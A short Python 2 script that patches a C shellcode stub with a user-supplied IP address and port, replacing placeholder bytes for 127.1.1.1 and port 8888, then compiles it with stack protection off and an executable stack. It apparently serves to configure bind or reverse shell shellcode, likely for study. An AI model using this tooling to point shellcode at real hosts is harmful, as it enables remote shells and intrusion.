#!/usr/bin/python
import sys
import socket
print "Stub File:"+sys.argv[1]
print "IP Addr:"+sys.argv[2]
print "Port Used:"+ sys.argv[3]
ip_addr= sys.argv[2].split(".")
ip_addr_bytes = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip_addr))

with open(sys.argv[1]+".c", "rb") as f:
    contents = f.readlines()

def H( hexStr ):
    bytes = []
    hexStr = ''.join( hexStr.split(" ") )
    for i in range(0, len(hexStr), 2):
        bytes.append( chr( int (hexStr[i:i+2], 16 ) ) )
    return ''.join( bytes )

ip_addr_final= repr(H(ip_addr_bytes)).replace("'","")

port = hex(int(sys.argv[3])).split('x')[1]
fh, sh = port[:2],port[2:]
if len(fh) == 1: fh = "0" + fh
if len(sh) == 1: sh = "0" + sh
_p = "\\x{0}\\x{1}".format(fh,sh)
for j,i in enumerate(contents):
    if "\\x22\\xb8" in i:
        print "Line Number :" + str(j)
	contents[j] = '"' + _p +'"'
    elif "\\x7f\\x01\\x01\\x01" in i:
	print "Line Number :" + str(j)
	contents[j] = '"' +ip_addr_final + '"' 
nf = sys.argv[1]+"_new.c"
with open(nf, "wb") as f:
    f.writelines(contents)
import os
os.system("gcc {0} -o {1} -fno-stack-protector -z execstack".format(nf,sys.argv[1]))
os.system("rm {0}".format(nf))
